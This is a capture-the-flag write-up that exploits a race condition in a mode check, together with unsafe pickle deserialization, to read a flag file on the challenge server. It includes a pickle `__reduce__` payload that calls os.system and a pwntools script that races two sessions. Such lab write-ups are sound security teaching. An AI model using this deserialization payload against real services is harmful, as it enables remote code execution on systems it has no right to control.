# Challenge `Pickles in a seri(al)ous race` Writeup

- Vulnerability:
    - Time-of-check/Time-of-use Race Condition and Remote Code Execution

- Where:
    - `pickle.dumps` and `check_mode` functions

- Impact:
    - Allows Remote Code Execution on the server

## Steps to reproduce

### Step 0: Analyze the source code
This challenge involves gaining access to a file within the server where the script is executed. The script provides users with the ability to generate users and create or view files. Files can be generated in either `CLASSY` or `FREE` mode, and they can only be accessed in the same mode. In `CLASSY` mode, the script uses pickle to serialize and deserialize file content, whereas `FREE` mode stores information in plain text. It's important to note that the pickle library is known to be susceptible to remote code execution.

### Step 1: Create our `__reduce__` function
Since pickle.dumps is exploitable, by implementing `__reduce__` in a class which instances we are going to pickle, we can give the pickling process a callable plus some arguments to run. While intended for reconstructing objects, we can abuse this for getting our own reverse shell code executed.

```python
class RCE:
    def __reduce__(self):
        cmd = ('cat home/ctf/flag')
        return os.system, (cmd,)
    
pickled = pickle.dumps(RCE())
```

### Step 2: Create sessions
The problem is that in `CLASSY_MODE`, the script serializes the Note object instead of user input. To work around this, the payload must be written in `FREE_MODE`, exploiting a race condition in user mode verification to later read in `CLASSY_MODE`.

```python
if not check_mode(FREE_MODE):
    reset(FREE_MODE)
```

Therefore, we first create two sessions (classy an free) with the same user. Then, in the free session, enter the `FREE_MODE` and in the classy enter the `CLASSY_MODE`.

```python
classy = remote(SERVER, PORT)
free = remote(SERVER, PORT)

classy.recvuntil(b'Username: ')
classy.sendline(b'hacker')

free.recvuntil(b'Username: ')
free.sendline(b'hacker')

classy.recvuntil(b'>>> ')
classy.sendline(b'0')
classy.recvuntil(b'>>> ')

free.recvuntil(b'>>> ')
free.sendline(b'1')
```
### Step 3: Get the flag
As the check_mode is confirmed at the start, it's now possible to write the payload to a `FREE_MODE` file and subsequently read it in `CLASSY_MODE` without it being deleted.

```python
free.recvuntil(b'>>> ')
free.sendline(b'1')
free.recvuntil(b'>>> ')
free.sendline(b'1')
free.recvuntil(b'note_name: ')
free.sendline(b"flag")
free.recvuntil(b'note_content: ')
free.sendline(pickled)
free.sendline()
sleep(1)

classy.sendline(b'0')
classy.recvuntil(b'note_name: ')
classy.sendline(b"flag")
print(classy.recvuntil(b'}').decode('utf-8'))
```

At the end, the flag is printed.

Note: The sleep is necessary to ensure that the file is written before it is read.

## Implementation

The full implementation can be found [here](pickles.py).
